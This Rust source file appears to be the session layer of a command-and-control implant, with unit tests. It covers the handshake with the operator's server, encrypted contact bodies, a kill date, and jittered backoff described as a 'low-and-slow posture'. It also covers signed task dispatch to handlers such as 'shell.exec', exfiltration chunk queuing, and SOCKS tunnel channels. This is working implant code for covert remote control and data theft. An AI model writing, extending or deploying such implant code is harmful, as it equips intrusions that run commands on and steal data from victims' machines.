use prost::Message;

use crate::channel::{self, Channels};
use crate::envelope;
use crate::handlers::{self, Cadence};
use crate::outbox::Outbox;
use crate::trust::Certificate;
use crate::verify::{self, NonceTracker, Verdict};
use crate::wire::{
    ChannelOutput, Frame, FrameKind, HandshakeRequest, HandshakeResponse, ProtocolVersion,
    TaskRequest,
};

/// Everything a contact carriage needs to serve one run: identity, the
/// advertisement, the live cadence, the seal, the signer pool, and the
/// cross-carriage task state (nonce floor, ledger, batch). Carriages borrow
/// the session; the session owns nothing transport-shaped. The nonce floor
/// deliberately spans carriages and reconnects -- the server's counter is
/// per-implant, so a replay through any door falls at the same floor.
pub struct Session {
    pub implant_id: String,
    advertised: Vec<String>,
    pub cadence: Cadence,
    pub seal: Option<Seal>,
    signer_pool: Vec<Certificate>,
    pub kill_date: Option<String>,
    pub nonces: NonceTracker,
    pub outbox: Outbox,
    pub channels: Channels,
    contact_counter: u64,
}

/// The per-artifact contact seal split into its wire halves.
pub struct Seal {
    pub key_id: [u8; 16],
    pub key: [u8; 32],
}

impl Seal {
    pub fn parse(baked: &str) -> Option<Seal> {
        let (key_id, key) = envelope::parse_baked_key(baked)?;
        Some(Seal { key_id, key })
    }

    pub fn seal(&self, plaintext: &[u8], aad: &str) -> Vec<u8> {
        envelope::seal_contact_body(plaintext, &self.key_id, &self.key, aad)
    }

    pub fn open(&self, body: &[u8], aad: &str) -> Option<Vec<u8>> {
        envelope::try_open_contact_body(body, &self.key_id, &self.key, aad)
    }
}

/// What the run loop does after one contact attempt.
pub enum Attempt {
    /// The cycle crossed and its response was processed.
    Crossed,
    /// The server's answer is permanent for this artifact.
    Refused,
}

impl Session {
    pub fn new(
        implant_id: String,
        baked_verbs: &[String],
        cadence: Cadence,
        signer_pool: Vec<Certificate>,
        seal: Option<Seal>,
        kill_date: Option<String>,
        poll_carriage: bool,
    ) -> Session {
        // The advertisement is the baked class verbs intersected with this
        // build's compiled handlers: the server only dispatches what this
        // binary can run (architecture.md Sec 5.3). A poll bake carrying a
        // channel verb also opts into the degraded channel discipline: the
        // wire-contract capability that parks operator input server-side and
        // drains it onto this implant's poll contacts. A stream bake must
        // NOT opt in -- the input route prefers the park whenever it sees
        // the advertisement, and a long-lived stream never drains one, so
        // its input rides the live sink instead.
        let mut advertised = baked_verbs
            .iter()
            .filter(|verb| handlers::COMPILED_VERBS.contains(&verb.as_str()))
            .cloned()
            .collect::<Vec<_>>();
        if poll_carriage && advertised.iter().any(|verb| channel::is_channel_verb(verb)) {
            advertised.push("channels.poll".to_string());
        }
        Session {
            implant_id,
            advertised,
            cadence,
            seal,
            signer_pool,
            kill_date,
            nonces: NonceTracker::default(),
            outbox: Outbox::default(),
            channels: Channels::new(),
            contact_counter: 0,
        }
    }

    /// Extends the advertisement with a carriage-negotiation capability --
    /// the socket family's live-session switch -- before the first
    /// handshake. Idempotent.
    pub fn advertise(&mut self, capability: &str) {
        if !self.advertised.iter().any(|held| held == capability) {
            self.advertised.push(capability.to_string());
        }
    }

    pub fn kill_date_passed(&self) -> bool {
        self.kill_date
            .as_deref()
            .and_then(crate::profile::parse_iso_to_unix)
            .map(|kill| crate::profile::unix_now() > kill)
            .unwrap_or(false)
    }

    /// The jittered inter-cycle sleep, widened by consecutive failures --
    /// the exponential reconnect backoff the low-and-slow posture calls for.
    pub fn backoff_sleep(&self, failures: u32) {
        let (base, jitter) = *self.cadence.lock().expect("cadence");
        let widened = (base.max(1.0) * 2f64.powi(failures.min(5) as i32)).min(600.0);
        let slack = if jitter > 0.0 {
            rand::Rng::gen_range(&mut rand::thread_rng(), -jitter..=jitter)
        } else {
            0.0
        };
        std::thread::sleep(std::time::Duration::from_secs_f64(
            (widened + slack).max(0.1),
        ));
    }

    /// The handshake this run opens every contact with: identity, protocol
    /// version, both negotiation arms, and the fresh cadence (architecture.md
    /// Sec 10.3 -- one advertisement rides each contact).
    pub fn handshake_frame(&mut self) -> Frame {
        let (sleep, jitter) = *self.cadence.lock().expect("cadence");
        Frame {
            payload: HandshakeRequest {
                version: Some(ProtocolVersion { major: 1, minor: 0 }),
                implant_id: self.implant_id.clone(),
                capabilities: self.advertised.clone(),
                replay_nonces: Some(true),
                task_acks: Some(true),
                sleep_seconds: Some(sleep),
                jitter_seconds: Some(jitter),
            }
            .encode_to_vec(),
            kind: 0,
        }
    }

    /// Reads the handshake answer: negotiates the nonce arm and returns the
    /// ack arm plus the run decision.
    pub fn handshake_answered(&mut self, frame: &Frame) -> Result<(bool, Attempt), &'static str> {
        let answer = HandshakeResponse::decode(frame.payload.as_ref())
            .map_err(|_| "the handshake answer was malformed")?;
        if answer.status != crate::wire::HandshakeStatus::Ok as i32 {
            return Ok((false, Attempt::Refused));
        }
        self.nonces.negotiated = answer.replay_nonces.unwrap_or(false);
        Ok((answer.task_acks.unwrap_or(false), Attempt::Crossed))
    }

    /// Encodes frames as this run's outgoing body: the framed bytes behind a
    /// fresh big-endian counter, sealed under the bake's key when it carries
    /// one; the counter burns per attempt, not per delivery, so a
    /// retransmission never trips the server's replay floor.
    pub fn encode_outgoing(&mut self, frames: &[Frame]) -> (Vec<u8>, &'static str) {
        let encoded = crate::wire::encode(frames);
        match &self.seal {
            Some(seal) => {
                self.contact_counter += 1;
                let mut plaintext = Vec::with_capacity(8 + encoded.len());
                plaintext.extend_from_slice(&self.contact_counter.to_be_bytes());
                plaintext.extend_from_slice(&encoded);
                (
                    seal.seal(&plaintext, envelope::CONTACT_REQUEST_AAD),
                    "text/plain",
                )
            }
            None => (encoded, "application/octet-stream"),
        }
    }

    /// Decodes an incoming body: sealed under the response's own purpose tag
    /// when the run seals, else the plaintext frames. A body that does not
    /// verify is a dropped cycle -- nothing inside it is acted on.
    pub fn decode_incoming(&self, body: &[u8]) -> Option<Vec<Frame>> {
        let plaintext = match &self.seal {
            Some(seal) => seal.open(body, envelope::CONTACT_RESPONSE_AAD)?,
            None => body.to_vec(),
        };
        crate::wire::parse(&plaintext)
    }

    /// The acceptance every carriage runs for one dispatched task:
    /// verification first (the replay defense stays ahead of the ledger),
    /// then dedup from the cache, then dispatch. Results and exfil chunks
    /// queue into the batch; the delivery mark is the carriage's to set.
    pub fn accept(&mut self, task: &TaskRequest, acks: bool) {
        if acks {
            self.outbox.acknowledge(&task.task_id);
        }
        if task.staged_bytes.is_some() {
            // The staged arm is carriage-specific: the poll batch defers the
            // pull to its next cycle, the stream pulls inline. Both reach
            // this method only after their own staged handling, so landing
            // here with the flag set means the carriage declined it.
            return;
        }
        let verdict = verify::verify(&self.implant_id, task, &self.signer_pool, &mut self.nonces);
        match verdict {
            Verdict::Accepted => {
                if self.outbox.holds(&task.task_id) {
                    // The dedup half: a redelivery is answered from the cache
                    // (or, while unfinished, merely re-acked) -- nothing
                    // re-executes.
                    if let Some((outcome, output)) = self.outbox.cached(&task.task_id) {
                        self.outbox.result(&task.task_id, outcome, &output);
                    }
                    return;
                }
                if self.channels.holds(&task.task_id) {
                    // A live channel: already accepted above, and its result
                    // comes when the channel ends -- a redelivery re-acks and
                    // nothing re-spawns.
                    return;
                }
                if channel::is_channel_verb(&task.verb) {
                    // The streaming task shape: the TaskRequest opens a
                    // channel instead of a completion. Output streams as
                    // ChannelOutput frames, input arrives as ChannelInput
                    // frames the carriages route in, and the final result
                    // queues when the channel reports it finished.
                    self.channels
                        .spawn(&task.verb, &task.task_id, &task.arguments);
                    return;
                }
                // Dispatch runs exactly once: the result and its out-of-band
                // chunks both come off this one execution.
                let handler = handlers::dispatch(&task.verb, &task.arguments, &self.cadence);
                self.outbox
                    .result(&task.task_id, handler.outcome, &handler.output);
                for mut chunk in handler.chunks {
                    chunk.task_id = task.task_id.clone();
                    self.outbox.queue(Frame {
                        payload: chunk.encode_to_vec(),
                        kind: FrameKind::ExfilChunk as i32,
                    });
                }
            }
            rejected => {
                let cause = match rejected {
                    Verdict::RejectedReplay => format!(
                        "task rejected: replayed tasking (nonce {:?} at or below the accepted floor); not executed",
                        task.task_nonce
                    ),
                    Verdict::RejectedNoNonce => {
                        "task rejected: no task nonce after the replay-nonce handshake; not executed".to_string()
                    }
                    _ => "task rejected: signature verification failed; not executed".to_string(),
                };
                self.outbox
                    .result(&task.task_id, crate::handlers::Outcome::Failed, &cause);
            }
        }
    }

    /// Moves the channel layer's produce into the batch: output chunks queue
    /// as ChannelOutput frames (upstream under the same seal and counter as
    /// every other frame), and a finished channel reports its task like any
    /// one-shot dispatch. The carriages call this at their delivery edges --
    /// the poll cycle's boundaries, the stream's message ticks -- so no
    /// pump ever touches a carriage.
    pub fn drain_channels(&mut self) {
        while let Some(event) = self.channels.next_event() {
            match event {
                channel::Event::Output { task, data } => {
                    self.outbox.queue(Frame {
                        payload: ChannelOutput {
                            task_id: task,
                            data,
                        }
                        .encode_to_vec(),
                        kind: FrameKind::ChannelOutput as i32,
                    });
                }
                channel::Event::Finished {
                    task,
                    outcome,
                    output,
                } => {
                    self.outbox.result(&task, outcome, &output);
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::wire::{HandshakeRequest, HandshakeResponse, TaskResult};
    use rsa::pkcs8::EncodePublicKey;
    use rsa::signature::{RandomizedSigner, SignatureEncoding};

    fn cadence() -> Cadence {
        std::sync::Arc::new(std::sync::Mutex::new((30.0, 0.0)))
    }

    fn bare_session(seal: Option<Seal>) -> Session {
        Session::new("i-1".into(), &[], cadence(), Vec::new(), seal, None, true)
    }

    fn advertised_of(session: &mut Session) -> Vec<String> {
        HandshakeRequest::decode(session.handshake_frame().payload.as_ref())
            .expect("the handshake decodes")
            .capabilities
    }

    #[test]
    fn sealed_cycles_round_trip_and_burn_a_counter_per_attempt() {
        let mut session = bare_session(Some(Seal {
            key_id: [0x11; 16],
            key: [0x22; 32],
        }));
        let handshake = session.handshake_frame();
        let first = session.encode_outgoing(&[handshake]).0;
        let second = session.encode_outgoing(&[]).0;
        // The counter burns per attempt, not per delivery, so a
        // retransmission never trips the server's replay floor.
        assert_ne!(first, second);
        // The response side opens under its own purpose tag -- and refuses
        // the request tag's bytes.
        let inbound = crate::envelope::seal_contact_body(
            b"",
            &[0x11; 16],
            &[0x22; 32],
            crate::envelope::CONTACT_RESPONSE_AAD,
        );
        assert_eq!(
            session.decode_incoming(&inbound).map(|frames| frames.len()),
            Some(0)
        );
        assert_eq!(session.decode_incoming(&first), None);
    }

    #[test]
    fn unsealed_cycles_pass_frames_through() {
        let mut session = bare_session(None);
        let handshake = session.handshake_frame();
        let (body, content_type) = session.encode_outgoing(&[handshake]);
        assert_eq!(content_type, "application/octet-stream");
        assert_eq!(
            session.decode_incoming(&body).map(|frames| frames.len()),
            Some(1)
        );
    }

    #[test]
    fn handshake_answers_negotiate_or_refuse() {
        let mut session = bare_session(None);
        let answer = Frame {
            payload: HandshakeResponse {
                status: crate::wire::HandshakeStatus::Ok as i32,
                replay_nonces: Some(true),
                task_acks: Some(true),
                ..Default::default()
            }
            .encode_to_vec(),
            kind: 0,
        };
        let (acks, attempt) = session
            .handshake_answered(&answer)
            .expect("the answer reads");
        assert!(acks);
        assert!(matches!(attempt, Attempt::Crossed));
        assert!(session.nonces.negotiated);
        let refused = Frame {
            payload: HandshakeResponse {
                status: crate::wire::HandshakeStatus::ImplantRetired as i32,
                ..Default::default()
            }
            .encode_to_vec(),
            kind: 0,
        };
        let (_, attempt) = session
            .handshake_answered(&refused)
            .expect("the answer reads");
        assert!(matches!(attempt, Attempt::Refused));
        let garbage = Frame {
            payload: vec![0xff, 0xff, 0xff, 0xff],
            kind: 0,
        };
        assert!(session.handshake_answered(&garbage).is_err());
    }

    #[test]
    fn the_advertisement_intersects_the_compiled_handlers() {
        let baked = ["shell.exec".to_string(), "no.such.verb".to_string()];
        let mut session = Session::new("i".into(), &baked, cadence(), Vec::new(), None, None, true);
        assert_eq!(advertised_of(&mut session), vec!["shell.exec".to_string()]);
    }

    #[test]
    fn poll_bakes_opt_into_the_degraded_channel_walk() {
        let baked = ["tunnel.socks".to_string(), "shell.exec".to_string()];
        let mut poll = Session::new("i".into(), &baked, cadence(), Vec::new(), None, None, true);
        assert!(advertised_of(&mut poll).contains(&"channels.poll".to_string()));
        // A stream bake must not: the park would never drain.
        let mut stream = Session::new("i".into(), &baked, cadence(), Vec::new(), None, None, false);
        assert!(!advertised_of(&mut stream).contains(&"channels.poll".to_string()));
    }

    #[test]
    fn carriage_advertisements_are_idempotent() {
        let mut session = bare_session(None);
        session.advertise("cap.x");
        session.advertise("cap.x");
        let advertised = advertised_of(&mut session);
        assert_eq!(advertised.iter().filter(|cap| *cap == "cap.x").count(), 1);
    }

    #[test]
    fn unsigned_tasking_fails_closed_into_the_batch() {
        let mut session = bare_session(None);
        let task = TaskRequest {
            task_id: "t-1".into(),
            verb: "shell.exec".into(),
            arguments: "id".into(),
            ..Default::default()
        };
        session.accept(&task, false);
        let batch = session.outbox.batch();
        assert_eq!(batch.len(), 1);
        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
        assert_eq!(result.outcome, 2);
        assert!(result.output.contains("signature"), "{}", result.output);
    }

    #[test]
    fn nonceless_redelivery_answers_from_the_ledger_cache() {
        let mut rng = rand::thread_rng();
        let private = rsa::RsaPrivateKey::new(&mut rng, 2048).expect("rsa keygen");
        let spki = private
            .to_public_key()
            .to_public_key_der()
            .expect("spki der");
        let signer = Certificate {
            raw: Vec::new(),
            spki: spki.as_bytes().to_vec(),
        };
        let mut session =
            Session::new("i-1".into(), &[], cadence(), vec![signer], None, None, true);
        let mut task = TaskRequest {
            task_id: "t-1".into(),
            verb: "no.such.verb".into(),
            arguments: "x".into(),
            ..Default::default()
        };
        let canonical =
            crate::verify::canonical_bytes("i-1", &task.task_id, &task.verb, &task.arguments, None);
        let signing = rsa::pss::SigningKey::<sha2::Sha256>::new(private);
        let mut rng = rand::thread_rng();
        task.signature = signing.sign_with_rng(&mut rng, &canonical).to_vec();
        // First delivery: the ack, then the one dispatch's result.
        session.accept(&task, true);
        let first = session.outbox.batch();
        assert_eq!(first.len(), 2, "the ack and the result");
        let executed = TaskResult::decode(first[1].payload.as_ref()).expect("the result decodes");
        session.outbox.batch_crossed(first.len());
        // Redelivery: re-acked and answered from the cache, with the same
        // output the single execution produced.
        session.accept(&task, true);
        let second = session.outbox.batch();
        assert_eq!(second.len(), 2);
        let cached = TaskResult::decode(second[1].payload.as_ref()).expect("the cached result");
        assert_eq!(cached.task_id, executed.task_id);
        assert_eq!(cached.output, executed.output);
    }
}
